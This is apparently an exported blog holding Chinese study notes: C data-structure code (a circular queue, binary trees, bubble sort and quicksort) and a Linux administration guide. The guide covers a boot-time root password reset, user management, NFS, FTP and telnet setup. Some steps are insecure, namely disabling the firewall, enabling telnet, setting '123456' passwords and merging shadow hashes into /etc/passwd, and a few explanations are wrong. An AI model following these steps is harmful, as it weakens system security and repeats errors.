printf("出队失败\n"); &#125; traverse_queue(&amp;Q); return 0;&#125;// 初始化队列 void init(QUEUE * pQ)&#123; pQ-&gt;pBase = (int *)malloc(sizeof(int)*6); if(pQ-&gt;pBase == NULL)&#123; printf("内存分配失败\n"); exit(-1); &#125; pQ-&gt;front = 0; pQ-&gt;real = 0; return;&#125; // 判断队列是否已满bool is_full(QUEUE *pQ)&#123; if((pQ-&gt;real+1)%6==pQ-&gt;front)&#123; // 已满 return true; &#125;else&#123; // 未满 return false; &#125;&#125; // 入队bool en_queue(QUEUE *pQ, int val)&#123; // 判断队列是否已满 if(!is_full(pQ))&#123; // 未满 pQ-&gt;pBase[pQ-&gt;real] = val; pQ-&gt;real = (pQ-&gt;real+1)%6; return true; &#125; else&#123; // 已满 return false; &#125; &#125; // 遍历队列void traverse_queue(QUEUE * pQ)&#123; if(!is_empty(pQ))&#123; int i = pQ-&gt;front; while(i!=pQ-&gt;real)&#123; printf("%d ", pQ-&gt;pBase[i]); i = (i+1)%6; &#125; printf("\n"); &#125;else&#123; printf("队列为空\n"); &#125; &#125;// 判断队列是否为空bool is_empty(QUEUE * pQ)&#123; if(pQ-&gt;front == pQ-&gt;real)&#123; // 为空 return true; &#125;else&#123; // 不为空 return false; &#125;&#125;// 出队bool out_queue(QUEUE * pQ, int * val)&#123; if(!is_empty(pQ))&#123; // 非空 *val = pQ-&gt;pBase[pQ-&gt;front]; pQ-&gt;front = (pQ-&gt;front +1)%6; return true; &#125;else&#123; // 空 return false; &#125; &#125; 专题-&gt;递归定义 一个函数自己直接或间接调用自己 递归满足三个条件 递归必须得有一个明确的中止条件 该函数所处理的数据规模必须在递减 这个转化必须是可解的 循环和递归 递归 易于理解 速度慢 存储空间大 循环 不易理解 速度慢 存储空间小 使用递归的例子 求阶乘 1+2+3+4+…100的和 汉诺塔 走迷宫 递归的应用 树和森林就是以递归的方式定义的 树和图的很多算法都是以递归来实现的 很多数学公式就是以递归的方式定义的 模块二：非线性结构树树定义 专业定义 有且只有一个称为根的节点 有若干个互不相交的子树，这些子树本身也是一颗树 通俗定义 树是由节点和边组成 每个节点只有一个父节点但是可以有多个子节点 但有一个节点例外，该节点例外，该节点没有父节点，此节点称为根节点 专业术语节点 父节点 字节点 子孙 堂兄弟 深度 ​ 从根节点到最底层节点的层数称为深度 ​ 根节点是第一层 叶子节点 ​ 没有子节点的节点 非终端节点 ​ 实际就是非叶子节点 度 ​ 子节点的个数称为度 树分类 一般树 任意一个节点的子节点的个数都不受限制 二叉树 任意一个节点的子节点个数最多两个，且子节点的位置不可更改 分类 一般二叉树 满二叉树 在不增加树的层数前提下，无法再多添加一个节点的二叉树就是满二叉树 完全二叉树 如果只是删除了满二叉树最底层最右边的连续若干个节点，这样形成的二叉树就是完全二叉树 森林 n个互不相交的树的集合 树的存储 二叉树的存储 连续存储【完全二叉树】 优点 查找某个节点的父节点和子节点(也包括判断有没有父节点和子节点)速度很快 缺点 耗用内存空间 一般树存储 双亲表示法 求父节点方便 孩子表示法 求子节点方便 双亲孩子表示法 求父节点和子节点都很方便 二叉树表示法 把一个普通树转化成二叉树来存储 123456具体转换方法： 设法保证任意一个节点的 左指针域指向它的第一个孩子节点 右指针域指向它的下一个兄弟节点 只要能满足此条件，就可以把一个普通树转化成为二叉树 一个普通树转化成的二叉树一定没有右子树 森林的存储 先把森林转化为二叉树，再存储二叉树。 二叉树操作 遍历 先序遍历 123先访问根节点再先序访问左子树再先序访问右子树 中序遍历 123先中序遍历左子树再访问根节点再中序遍历右子树 后序遍历 123先中序遍历左子树再中序遍历右子树再访问根节点 已知两种遍历序列求原始二叉树 通过 先序遍历 和 中序遍历 或者 中序遍历 和后序遍历 我们可以还原出原始二叉树 但是通过先序遍历 和 后续遍历 无法还原出原始二叉树 已知先序和中序求后序 123先序：ABCDEFGH中序：BDCEAFHG求后序：？ 123先序：ABDGHCEFI中序：GDHBAECIF后序：？ 已知中序和后序求先序 123中序：BDCEAFHG后序：DECBHGFA先序：？ 图 待学习… 排序算法冒泡排序实现代码123456789101112131415161718192021222324252627282930# include &lt;stdio.h&gt;// 两个冒泡排序区别是：一个是把排序后的值往前冒， 一个是往后冒。// 这个是往前冒 int main(void)&#123; int arr[5] = &#123;23, 55, -44, 18, 32&#125;; int i,j,t; printf("排序前：\n"); for(i =0; i&lt;5;i++)&#123; printf("%d ", arr[i]); &#125; printf("\n"); for(i=0;i&lt;5;i++)&#123; for(j=i+1;j&lt;5;j++)&#123; if(arr[i]&gt;arr[j])&#123; t = arr[i]; arr[i] = arr[j]; arr[j] = t; &#125; &#125; &#125; printf("排序后：\n"); for(i =0; i&lt;5;i++)&#123; printf("%d ", arr[i]); &#125; &#125; 1234567891011121314151617181920212223242526272829303132# include &lt;stdio.h&gt;// 两个冒泡排序区别是：一个是把排序后的值往前冒， 一个是往后冒// 这个是往后冒 int main(void)&#123; int a[] = &#123;23, -45, 67, -22, 48, 45&#125;; int i,j,t; printf("排序前：\n"); for(i = 0; i&lt;5;i++)&#123; printf("%d ", a[i]); &#125; printf("\n"); for(i = 0 ; i&lt;5; i++)&#123; for(j=0; j&lt;=i-1;j++)&#123; if(a[i]&lt;a[j])&#123; t = a[i]; a[i] = a[j]; a[j] = t; &#125; &#125; &#125; printf("排序后：\n"); for(i = 0; i&lt;5;i++)&#123; printf("%d ", a[i]); &#125; return 0;&#125; 快速排序原理图 实现代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354# include &lt;stdio.h&gt;void QuickSort(int * a, int low, int high);int FindPos(int * a, int low, int high);int main(void)&#123; int a[] = &#123;5,2,6,8,4,3,7&#125;; // 快速排序 QuickSort(a, 0, 6); for(int i=0;i&lt;7;i++)&#123; printf("%d ", a[i]); &#125; printf("\n"); return 0;&#125;/* 从H开始 val比 H大移 小赋值 val比L小移 大赋值 判断L == H */// 快速排序void QuickSort(int * a, int low, int high)&#123; int pos; if(low &lt; high)&#123; pos = FindPos(a, low, high); QuickSort(a, low, pos-1); QuickSort(a, pos+1, high); &#125; &#125;// 用于查找首个元素排序后的下标位置int FindPos(int * a, int low, int high)&#123; int val = a[low]; int temp; while(low&lt;high)&#123; while(low&lt;high &amp;&amp; a[high]&gt;=val)&#123; high --; &#125; a[high] = a[low]; while(low&lt;high &amp;&amp; a[low]&lt;=val)&#123; low ++; &#125; a[low] = a[high]; &#125; return low; &#125; 插入排序选择排序归并排序查找算法 待学习…]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux学习笔记]]></title>
    <url>%2F2021%2F12%2F31%2FLinux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[并未涉及Linux全部内容，根据上课所做的一份笔记 Linux进入拯救模式修改root密码 选择系统时按 e 在 UTF-8 后添加 init=/bin/sh 按ctrl+x 保存启动 可能会乱码 执行LANG=en 添加权限mount -o remount rw, / 修改密码 passwd root touch /.autorelabel 重启 exec /sbin/init 报错 passwd:Authentication token manipulation error 将 shadow- 重命名为 shadow 设置时区查看所有时区命令 timedatectl list-timezones 123456789101112[root@localhost tmp]# timedatectl list-timezonesAfrica/AbidjanAfrica/AccraAfrica/Addis_AbabaAfrica/AlgiersAfrica/AsmaraAfrica/BamakoAfrica/BanguiAfrica/BanjulAfrica/BissauAfrica/BlantyreAfrica/Brazzaville 设置时区 timedatectl set-timezone &quot;Asia/Shanghai&quot; 查看时间 clock 12[root@localhost tmp]# clock2021年11月21日 星期日 19时45分48秒 -0.744897 秒 data -R 12[root@localhost tmp]# date -RSun, 21 Nov 2021 19:44:39 +0800 文件命令相关操作创建文件夹 mkdir 创建文件 touch 文件名 cat “内容”&gt;文件名 echo “内容”&gt;文件名 查看文件 cat 文件名 移动文件 mv 文件名 移动目录/ 删除文件 rm 文件名 查找文件 find 路径 -name 文件名 创建一个大小为4G的文件dd if=/dev/zero of=文件名 bs=1 count=0 seek=4G 12345678[root@localhost tmp]# dd if=/dev/zero of=1.txt bs=1 count=0 seek=4G记录了0+0 的读入记录了0+0 的写出0字节(0 B)已复制，0.00341132 秒，0.0 kB/秒[root@localhost tmp]# ll总用量 4-rw-r--r--. 1 root root 4294967296 11月 21 19:46 1.txt 系统运行级与运行级的切换系统运行级 运行级 状态 0 关闭计算机 1 单用户拯救模式 2 多用户模式 3 多用户模式 4 多用户模式 5 多用户模式，用于自动启动XFree86系统(图形界面) 6 重新启动 Q/q 重新加载init守护进程配置 U/u 重新执行init守护进程 切换运行级1init 1 查看当前系统运行级1runlevel 12[root@localhost ~]# runlevel1 3 系统运行级的服务12chkconfig 查看服务// 只能查看SysV服务，基本被systemctl 命令取代 123456789101112[root@localhost ~]# chkconfig --list注：该输出结果只显示 SysV 服务，并不包含原生 systemd 服务。SysV 配置数据可能被原生 systemd 配置覆盖。 要列出 systemd 服务，请执行 'systemctl list-unit-files'。 查看在具体 target 启用的服务请执行 'systemctl list-dependencies [target]'。netconsole 0:关 1:关 2:关 3:关 4:关 5:关 6:关network 0:关 1:关 2:开 3:开 4:开 5:开 6:关 1systemctl 列出系统中所有活动的服务 12345678910111213141516171819202122232425262728293031[root@localhost ~]# systemctl -t service UNIT LOAD ACTIVE SUB DESCRIPTION auditd.service loaded active running Security Auditing Service chronyd.service loaded active running NTP client/server crond.service loaded active running Command Scheduler dbus.service loaded active running D-Bus System Message Bus firewalld.service loaded active running firewalld - dynamic firewall daemon getty@tty1.service loaded active running Getty on tty1 ● kdump.service loaded failed failed Crash recovery kernel arming kmod-static-nodes.service loaded active exited Create list of required static device nodes for the current kernel lvm2-monitor.service loaded active exited Monitoring of LVM2 mirrors, snapshots etc. using dmeventd or progress polling network.service loaded active exited LSB: Bring up/down networking NetworkManager-wait-online.service loaded active exited Network Manager Wait Online NetworkManager.service loaded active running Network Manager polkit.service loaded active running Authorization Manager postfix.service loaded active running Postfix Mail Transport Agent rhel-dmesg.service loaded active exited Dump dmesg to /var/log/dmesg rhel-domainname.service loaded active exited Read and set NIS domainname from /etc/sysconfig/network rhel-import-state.service loaded active exited Import network configuration from initramfs rhel-readonly.service loaded active exited Configure read-only root support rsyslog.service loaded active running System Logging Service sshd.service loaded active running OpenSSH server daemon systemd-journal-flush.service loaded active exited Flush Journal to Persistent Storage systemd-journald.service loaded active running Journal Service systemd-logind.service loaded active running Login Service systemd-random-seed.service loaded active exited Load/Save Random Seed systemd-remount-fs.service loaded active exited Remount Root and Kernel File Systems systemd-sysctl.service loaded active exited Apply Kernel Variables systemd-tmpfiles-setup-dev.service loaded active exited Create Static Device Nodes in /dev systemd-tmpfiles-setup.service loaded active exited Create Volatile Files and Directories 显示系统环境 123[root@localhost ~]# systemctl show-environmentLANG=zh_CN.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin 获取系统默认目标的名称 12[root@localhost ~]# systemctl get-defaultmulti-user.target 禁用sshd服务 123[root@localhost ~]# systemctl disable sshd.serviceRemoved symlink /etc/systemd/system/multi-user.target.wants/sshd.service.// systemctl disable/enable sshd.service disable禁用 enable开启 从系统运行级5切换到系统运行级3 1systemctlusolate multi-user.target 未找到命令 显示NFS服务的运行状态 1systemctl status nfs.service 未找到服务 检查是否启用了ssh服务 12[root@localhost ~]# systemctl is-enabled sshdenabled 列出系统上安装的所有单元，包括失效或空的 1234567891011121314151617181920212223[root@localhost ~]# systemctl list-unit-filesUNIT FILE STATE proc-sys-fs-binfmt_misc.automount static dev-hugepages.mount static dev-mqueue.mount static proc-sys-fs-binfmt_misc.mount static sys-fs-fuse-connections.mount static sys-kernel-config.mount static sys-kernel-debug.mount static tmp.mount disabledbrandbot.path disabledsystemd-ask-password-console.path static systemd-ask-password-plymouth.path static systemd-ask-password-wall.path static session-1.scope static session-2.scope static session-3.scope static arp-ethers.service disabledauditd.service enabled autovt@.service enabled blk-availability.service disabledbrandbot.service static chrony-dnssrv@.service static 用户登录与账户管理添加用户 1useradd [选项] 用户名 选项 说明 -c&lt;备注&gt; 加上备注文章，备注文字会保存在passwd得备注栏位中 -d&lt;登录目录&gt; 指定用户登入时起始目录 -D 变更预设值 -e&lt;有效期限&gt; 指定账户的有效期限 -f&lt;缓存天数&gt; 指定在密码过期后多少天即关闭该帐号。 -g&lt;群组&gt; 指定用户所属的群组。 -G&lt;群组&gt; 指定用户所属的附加群组。 -m 自动建立用户的登入目录。 -M 不要自动建立用户的登入目录。 -n 取消建立以用户名称为名的群组． -s 指定用户登入后所使用的shell -u 指定用户ID 为添加的用户指定相应的用户组 1useradd -g root test01 创建一个系统用户 1useradd -r tt 为新添加的用户指定home目录 1useradd -d /home/test01 test01 设置用户密码 1passwd 用户名 批量创建用户 创建userfile.txt的文件 12student01:x:520:520::/home/student01:/sbin/nologinstudent02:x:521:521::/home/student02:/sbin/nologin 创建对应的userpwdfile.txt 12student01:123456student02:123456 使用newusers批量添加用户 1newusers userfile.txt | ![image-20211217090840336](https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20211217090840336.png) | | ------------------------------------------------------------ | chpasswd批量修改密码 执行命令/usr/sbin/pwunconv，将/etc/shadow产生的shadow密码解码，然后回写到/etc/passwd中， 并将/etc/shadow的shadow密码栏删掉。这是为了方便下一步的密码转换工作，即先取消shadow password功能，关闭影子文件。 123pwunconv // chpasswd &lt; userpwdfile.txt // 批量修改密码pwunconv // 恢复影子文件 cat /etc/passwd 删除用户 12userdel [-r] 用户名// -r 代表递归删除用户目录下的所有文件和文件夹 用户组操作添加用户群组12groupadd [选项] group// group群组名 删除用户群组12grouddel group// group 群组名 为用户添加用户组 -a 代表 append， 也就是 将自己添加到 用户组groupA 中，而不必离开 其他用户组。 1usermod -a -G groupA user 将用户登录名test01修改为test02，将工作目录改为/home/test02，将所属群组该为root 1usermod -l test01 test02 -d /home/test02 -m -g root 将用户从用户组中移除1gpasswd -d userName groupName 修改用户群组属性1groupmod [-g gid [-o]][-n new_group_name] old_group_name 选项 说明 -g gid 设置新群组的标识号 -o 重复使用群组的标识号 -n old_name new_name 设置新群组名称 ​ 查看登录用户who 查看目前登录的用户信息 w 查询登录用户的详细信息 last 搜索/var/log/wtmp文件 显示自创建该文件以来登录(和退出)的所有用户列表 lastlog 显示所有用户的最近登录情况，或者指定用户最近的登录情况 查看近两年登录的用户 1lastlog -t 2 改变用户身份su 1234567891011121314151617181920用法： su [选项] [-] [USER [参数]...]将有效用户 id 和组 id 更改为 USER 的 id。单个 - 视为 -l。如果未指定 USER，将假定为 root。选项： -m, -p, --preserve-environment 不重置环境变量 -g, --group &lt;组&gt; 指定主组 -G, --supp-group &lt;组&gt; 指定一个辅助组 -, -l, --login 使 shell 成为登录 shell -c, --command &lt;命令&gt; 使用 -c 向 shell 传递一条命令 --session-command &lt;命令&gt; 使用 -c 向 shell 传递一条命令 而不创建新会话 -f, --fast 向shell 传递 -f 选项(csh 或 tcsh) -s, --shell &lt;shell&gt; 若 /etc/shells 允许，则运行 shell -h, --help 显示此帮助并退出 -V, --version 输出版本信息并退出 在低权限用户下用root用户执行命令 1su -c "whoami" root sudo 123456789101112131415161718192021222324252627282930313233343536sudo - 以其他用户身份执行一条命令usage: sudo -h | -K | -k | -Vusage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [&lt;command&gt;]usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...选项： -A, --askpass 使用助手程序进行密码提示 -b, --background 在后台运行命令 -C, --close-from=num 关闭所有 &gt;= num 的文件描述符 -E, --preserve-env 在执行命令时保留用户环境 --preserve-env=list 保留特定的环境变量 -e, --edit 编辑文件而非执行命令 -g, --group=group 以指定的用户组或 ID 执行命令 -H, --set-home 将 HOME 变量设为目标用户的主目录。 -h, --help 显示帮助消息并退出 -h, --host=host 在主机上运行命令(如果插件支持) -i, --login 以目标用户身份运行一个登录 shell；可同时指定一条命令 -K, --remove-timestamp 完全移除时间戳文件 -k, --reset-timestamp 无效的时间戳文件 -l, --list 列出用户权限或检查某个特定命令；对于长格式，使用两次 -n, --non-interactive 非交互模式，不提示 -P, --preserve-groups 保留组向量，而非设置为目标的组向量 -p, --prompt=prompt 使用指定的密码提示 -r, --role=role 以指定的角色创建 SELinux 安全环境 -S, --stdin 从标准输入读取密码 -s, --shell 以目标用户运行 shell；可同时指定一条命令 -t, --type=type 以指定的类型创建 SELinux 安全环境 -T, --command-timeout=timeout 在达到指定时间限制后终止命令 -U, --other-user=user 在列表模式中显示用户的权限 -u, --user=user 以指定用户或 ID 运行命令(或编辑文件) -V, --version 显示版本信息并退出 -v, --validate 更新用户的时间戳而不执行命令 -- 停止处理命令行参数 文件系统管理软连接硬链接 ln 参数 说明 -s 创建软连接 -d 创建硬链接（不写默认） 软硬链接区别 软连接 软链接，以路径的形式存在。类似于Windows操作系统中的快捷方式 软链接可以 跨文件系统 ，硬链接不可以 软链接可以对一个不存在的文件名进行链接 软链接可以对目录进行链接 硬链接 硬链接，以文件副本的形式存在。但不占用实际空间。 不允许给目录创建硬链接 硬链接只有在同一个文件系统中才能创建 给文件创建一个软连接 1ln -s log2013.log link2013 给文件创建一个硬连接 1ln log2013.log ln2013 查看磁盘分区信息 1/sbin/fdisk -l 文件权限123chmod u+s [file] // 给用户的某个文件增加超级权限 参数 1234567891011121314151617181920212223242526272829303132333435363738u 文件所有者g 用户组o 其他用户a 所有用户--------------------------------------r(4) 读取权限w(2) 写入权限x(1) 执行权限t 粘贴位（给其他用户(o)设置超级权限的时候,没有执行权限(x)显示T,如果其他用户有执行权限(x)，那么就会变成t）s 特殊权限 - 没有权限所属者 对应 SUID 特殊权限所有者 对应 SGID 特殊权限所有人 对应 sticky 特殊权限当设置特殊权限为4 4转换为2进制为100分别对应所属者 所属组 所有人 1 0 0 那么特殊权限为SUID当设置特殊权限为1 1转换为2进制为001分别对应所属者 所属组 所有人 0 0 1 那么特殊权限为sticky 特殊权限 当权限编码数字长度为4个的时候，第一位表示特殊权限，后三位表示普通权限 第一位表示特殊权限时，具体分为8中情况： 当第一位是0，特殊权限为空 当第一位是1，特殊权限为sticky 当第一位是2，特殊权限为SGID 当第一位是3，特殊权限为SGID,sticky 当第一位是4，特殊权限为SUID 当第一位是5，特殊权限为SUID,sticky 当第一位是6，特殊权限为SUID,SGID 当第一位是7，特殊权限为SUID,SGID,sticky 快速转换十进制转二进制转换表 11 2 4 8 16 32 64 128 将 77 转为二进制 12345678910111213141516171819202122232425262728291 2 4 8 16 32 64 1280 0 0 0 0 0 0 0 77 在 64 -128 区间内在64 位将0 替换为11 2 4 8 16 32 64 1280 0 0 0 0 0 1 0 在将 77 - 64 = 1313 在 在 8 - 16 区间在8 位将0 替换为11 2 4 8 16 32 64 1280 0 0 1 0 0 1 0 在将 13 - 8 = 55 在 在 4 - 8 区间在4 位将0 替换为11 2 4 8 16 32 64 1280 0 1 1 0 0 1 0 在将 5 - 1 = 11 就是第一位直接将第一位替换为 11 2 4 8 16 32 64 1281 0 1 1 0 0 1 0 得到 10110010 反过来1001101 这就是 77 的二进制有了这个表 z chmod 4755 file 这个4表示其他用户执行该文件时，具有该文件所有者一样的权限 查看文件基本信息stat查看文件的修改信息 查看环境变量echo $PATH 磁盘分区查看磁盘容量 1df -h 查看指定文件或目录大小 1du -h /etc/passwd 磁盘分区 在分区前先给虚拟机添加一块硬盘 查看磁盘分区 fdisk -l 对刚刚挂载的磁盘分区 fdisk /dev/sdb n 新建分区 d 删除分区 l 展示分区编码号 w把实现的分区结果保存在磁盘中 可选 p(primary) 和 e (extended) 查看分区结果 格式化分区 mkfs.xfs /dev/sdb1 挂载 创建一个文件夹 mkdir /home/temp_disk 将分区挂载到新建的文件夹中 mount /dev/sdb1 /root/temp_disk 完成 报错问题 1234问题：mount: block device /dev/sr0 is write-protected, mounting read-only解决方式：mount -o remount,rw /dev/cdrom /mnt/cdrom 卸载 umout 分区名 删除分区 fdisk /dev/sdb centos7 启用NFS服务 yum.pid被锁定或sleeping 使用 rm -rf /var/run/yum/pid 条件：两台虚拟机 在A主机上操作 yum install -y nfs-utils rpcbind // 安装nfs mkdir /root/data // 创建共享目录 systemctl start nfs // 启动nfs 编辑 vim /etc/exports 1/root/data/ 172.20.10.0/24(rw,sync,all_squash) 检查端口启动情况 // 不关无法访问 systemctl stop firewalld.service 关闭防火墙 在主机B上操作 yum install -y nfs-utils rpcbind // 安装nfs showmount -e 172.20.10.134 // 在主机B上查看A可提供的挂载信息 如果没有显示，重新在A主机重启nfs服务 mkdir /mnt/test1 //创建挂载目录 mount -t nfs 172.20.10.134:/root/data /mnt/test1 //在主机B上实现NFS的挂载 df -h // 查看是否挂载成功 成功 创建文件测试 解决方式（在主机A 上 给data目录改变权限） chown -R nfsnobody:nfsnobody /root/data/ 再次测试 成功 卸载nfs 查找服务名 123rpm -qa | grep nfsrpm -qa | grep rpcbind 卸载查找到的服务名 1yum remove -y 服务名 磁盘文件与目录管理磁盘管理df 查看磁盘空间的使用情况 df -h 以便于阅读的方式输出磁盘空间信息 du 显示磁盘上目录或文件的大小 du -h [文件或目录] 以便于阅读的方式输出 pwd 显示当前目录 显示当前目录 查看文件内容的方式find 查找文件 以文件名称、后缀名、文件相关用户、文件大小、文件类型、文件访问、修改时间等去查询文件，但不包括以文件内容去查询 列出当前目录及字目录下后缀为txt的所有文件 find ./ -name “*.txt” 列出当前目录及字目录下所有文件 find ./ -type f （f 一般文件 d 目录 l 链接文件） 将查询出来的文件以ls输出方式显示出来 find -iname “*.txt” -exec ls -lh {} ; find -iname “*.txt” -ok [命令] {} ; // 与上一个命令功能一样，区别在于-ok 执行命令时 会询问用户 按照权限查找文件 find -perm 755 按照用户查找文件 find -user admin 按照文件的所属组来进行查找 find -group 文件所属组名 find -atime -1 （-1 一天以内 +1 一天以前） atime n天内被读取 mtime n月被读取 ctime n分钟被读取 aminn天内被修改 mminn月内被修改 cminn分钟内被修改 1234根据文件的大小来查找文件find -size 1Mfind -size -1M // 查找小于1MB的文件find -size +1M // 查找大于1MB的文件 1234按照文件的深度层次来进行查找find -depth -iname &quot;*.txt&quot; 将指定路径作为第一层，向下遍历到最深处，来查找每一层满足指定条件的文件find -maxdepth -iname &quot;*.txt&quot; 将指定路径作为第一层，向下遍历到第n层，来查找每一层满足指定条件的文件find -mindepth -iname &quot;*.txt&quot; 将指定路径作为第一层，从第n层开始向下遍历到最深处，来查找每一层满足指定条件的文件 123456将多个条件按照指定逻辑组合在一起进行文件查找逻辑组合有 -a: and 表示多个条件同时满足 -o: or 表示多个条件只需要满足一个即可find -type f -o -iname &quot;*.txt&quot;find -type f -a -iname &quot;*&quot; chmod 修改文件权限 cat 查看文件内容 适合查看行数较少的文件 head 查看文件的开头部分的内容 参数 说明 -q 隐藏文件名 -v 显示文件名 -c&lt;数目&gt; 显示的字节数 -n&lt;行数&gt; 显示的行数 more 类似 cat ，不过会以一页一页的形式显示 Enter 向下n行，需要定义。默认为1行 Ctrl+F 向下滚动一屏 空格键 向下滚动一屏 Ctrl+B 返回上一屏 = 输出当前行的行号 ：f 输出文件名和当前行的行号 V 调用vi编辑器 !命令 调用Shell，并执行命令 q 退出more 说明 参数 -num 一次显示的行数 +num 从第 num 行开始显示 less 进行文件内容的查看（适合查看大文件，相比与more，他的功能更全） enter：逐行下翻 空格：逐页下翻 ctrl+f:：逐页下翻 ctrl+b：逐页上翻 less +/关键字 filename 文本中关键字高亮显示 less +n filename 从第n行开始进行文件内容的查看 less +/关键字.\ 高亮显示任意文件中的关键字 less -N filename 显示行号 tail文件压缩与解压缩compress/uncompress压缩 compress filename 解压 uncompress filename gzip/gunzip压缩 gizp filename 解压 gunzip filename 文件备份与恢复tar压缩 tar -zcvf 原文件名.tar.gz 源文件名 解压 tar -xzvf 压缩包.tar.gz 简单信息处理wc 显示文件基本的统计信息（对应的行数、词数、字符数、文件名） 显示多个文件 1wc /目录/&#123;file1, file2&#125; grep 查找文件内容 语法 grep 关键字 文件名 12grep -c 关键字 文件名// 统计关键字在文本当中出现的次数 1234567891011121314grep -c -i 关键字 文件名// -i 忽略大小写grep -c -i 关键字 *.txt// -i 忽略大小写// *.txt 指定任意文件名类型为txt的文件grep -c -i 关键字 *.*// -i 忽略大小写// *.* 指定任意文件名任意类型的文件grep -c -i 关键字 /*// -i 忽略大小写// /* 指定路径下所有文件 12grep -n 关键字 filename// 显示增加行号 12grep -v 关键字 filename// 反向匹配，显示没有匹配到的行 sort 排序：是对文件的每一行进行排序（依据ASCII值） ASCII：American standard code of information interchage 0-9:48-57 A-Z:65-96 a-z:97-122 12345sort filenamesort -g filename// sort -n filenamesort -r filename cut 展现文件的局部范围的内容 cut -b 2-5,8,10 filename uniq 文本去重 在进行去重显示的时候，去重的规则是：连续重复出现 1234uniq filename 进行文件的去重展示uniq -c filename 针对文件当中出现的重复行进行计数uniq -u filename 将没有连续重复出现的行显示出来uniq -i filename 将连续重复出现的行忽略大小写，作为重复行，将进行去重显示 Linux包管理RPM 安装 查询（查询一个包是否安全） rpm -qa |grep telnet 检验：检验包安装的正确性 包升级 包删除 yum1234yum install -y packagey：代表下载并安装d:仅仅下载，并不安装N：直接退出 yum repolist 用于列出系统中已配置的yum源 yumexyum list yumex yum list installed ​ 进程管理shell编程vivi filename 命令模式，文本编辑模式，行编辑模式 vi filename 命令模式 i,a,s,o​ esc + shift + Q 进入行编辑模式 ​ esc + 双击y 对光标所在行进行复制 ​ esc + p 对复制的内容进行粘贴 ​ esc + 双击g 将光标移到首行 ​ esc + 双击d 删除当前行 ​ ctrl + insert 对选中的内容进行复制 ​ shift + insert 对已经复制的内容进行粘贴 文本编辑模式 ​ 内容编辑 行编辑模式 ​ q，q!，wq，w,wq! ​ /1 /[0-9] ​ ?1 未完待续 服务器搭建centos7 搭建ftp服务器 安装vsftpd 1yum install -y vsftpd 启动ftp服务器 1systemctl start vsftpd.service 配置ftp 配置文件目录 1/etc/vsftpd/vsftpd.conf 12345678910111213141516171819202122232425262728293031323334353637#除下面提及的参数，其他参数保持默认值即可。#修改下列参数的值：#禁止匿名登录FTP服务器。anonymous_enable=NO#允许本地用户登录FTP服务器。local_enable=YES#监听IPv4 sockets。listen=YES#在行首添加#注释掉以下参数：#关闭监听IPv6 sockets。#listen_ipv6=YES# 可能配置会没有 需要手动加入 #在配置文件的末尾添加下列参数：#设置本地用户登录后所在目录。 local_root=/var/ftp/test#全部用户被限制在主目录。chroot_local_user=YES#启用例外用户名单。chroot_list_enable=YES#指定例外用户列表文件，列表中用户不被锁定在主目录。chroot_list_file=/etc/vsftpd/chroot_list# vim 跳转到行末 :$#开启被动模式。pasv_enable=YESallow_writeable_chroot=YES#本教程中为Linux实例的公网IP。pasv_address=&lt;FTP服务器公网IP地址&gt;#设置被动模式下，建立数据传输可使用的端口范围的最小值。#建议您把端口范围设置在一段比较高的范围内，例如50000~50010，有助于提高访问FTP服务器的安全性。pasv_min_port=&lt;port number&gt;#设置被动模式下，建立数据传输可使用的端口范围的最大值。pasv_max_port=&lt;port number&gt; 防火墙放行相应端口 关闭防火墙命令 1systemctl stop firewalld 添加主端口 1firewall-cmd --permanent --zone=public --add-port=21/tcp 添加被动端口 1firewall-cmd --permanent --zone=public --add-port=65400-65410/tcp 重新加载防火墙 1firewall-cmd --reload 创建ftp用户 12345678910# 创建一个Linux用户adduser ftptest# 修改ftptest用户的密码passwd ftptest# 创建一个供FTP服务使用的文件目录mkdir /var/ftp/test# 创建测试文件touch /var/ftp/test/testfile.txt# 运行以下命令更改/var/ftp/test目录的拥有者为ftptestchown -R ftptest:ftptest /var/ftp/test 设置ftp服务开机启动 1systemctl enable vsftpd.service 测试 登录 卸载ftp服务器 查找vsftpd服务 1rpm -aq vsftpd 停止ftp服务 1systemctl stop vsftpd.service 卸载ftp服务 1rpm -e vsftpd-3.0.2-21.el7.x86_64 centos7 搭建telent服务 先检查是否安装了telnet 12rpm -qa | grep telnet //检查你的CentOS是否安装了telnet和telnet-serverrpm -qa xinetd //检查你的CentOS是否安装了xinetd，telnet的自启动依赖它 执行后都为空就是没有安装。 安装telnet并设置开机自启动 yum list |grep telnet //列出当前可用的rpm包 yum install telnet-server //安装telnet-server 服务端 yum install telnet //安装telnet 客户端 安装xinetd yum install -y xinetd systemctl enable xinetd.service //设置xinetd开机自启动 systemctl start xinetd.service //启动xinetd systemctl status xinetd.service //查看xinetd状态 设置telnet服务开机启动 systemctl enable telnet.socket //设置telnet服务开机启动 systemctl start telnet.socket //启动telnet服务 systemctl restart xinetd //telnet服务依赖xinetd守护，安装telnet-server后启动时需要重启xinetd服务 防火墙放行23端口 CentOS采用了 firewalld 防火墙,查询是否开启23端口 firewall-cmd –query-port=23/tcp firewall-cmd –zone=public –add-port=23/tcp –permanent // 放行23端口 firewall-cmd –complete-reload // 重新加载firewall-cmd 修改telnet配置文件，开启服务 /etc/xinetd.d/telnet // 没有就自己创建 vim /etc/xinetd.d/telnet ps -ef | grep xinetd // 查看xinetd是否启动 测试 telnet localhost // 登录测试 Login incorrect 报错解决 查看日志 tail /var/log/secure vim /etc/securetty //在该文件末尾添加pts/4 再次测试 成功 卸载telnet rpm -qa | grep telnet #显示telnet-server和telnet包 rpm -e telnet-0.17 #卸载telnet客户端 rpm -e telnet-server-0.17 #卸载telnet服务端 rpm -qa |grep xinetd // 显示xinetd包 rpm -e xinetd-2.3.15-14.el7.x86_64 // 卸载xinetd]]></content>
      <categories>
